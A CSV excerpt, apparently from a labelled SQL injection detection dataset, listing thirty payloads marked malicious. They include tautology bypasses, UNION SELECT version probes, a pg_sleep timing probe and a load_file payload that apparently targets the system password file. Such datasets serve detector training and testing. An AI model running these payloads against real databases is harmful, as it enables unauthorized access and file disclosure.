row_index,payload_norm,label,sqli_type_hint
30,"or 1 = 1 or """" =",1,
31,or 1 = 1,1,
32,"select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1,
33,"select * from users where id = '1' union select ||/1,version ( ) -- 1'",1,
34,"select * from users where id = '1' union select +\.,@@VERSION -- 1'",1,
35,or 1 = 1/*,1,
36,' or 1 = 1,1,
37,"select * from users where id = 1 <@&@ union select 1,version ( ) -- 1",1,
38,"select * from users where id = '1' union select $*$,@@VERSION -- 1'",1,
39,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1,
40,"select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",1,
41,select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1,
42,"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1,
43,"select * from users where id = 1 union select 1||1,version ( ) -- 1",1,
44,"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1,
45,select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1,
46,"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1,
47,"select * from users where id = 1 or "".@"" or 1 = 1 -- 1",1,
48,"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1,
49,or 1 --',1,
50,"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1,
51,"admin"" or 1 = 1#",1,
52,"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1",1,
53,\x27UNION SELECT,1,
54,PRINT,1,
55,"select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'",1,
56,or 1 = 1--,1,
57,1 or pg_sleep ( __TIME__ ) --,1,
58,"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1,
59,admin' ) or ( '1' = '1'/*,1,
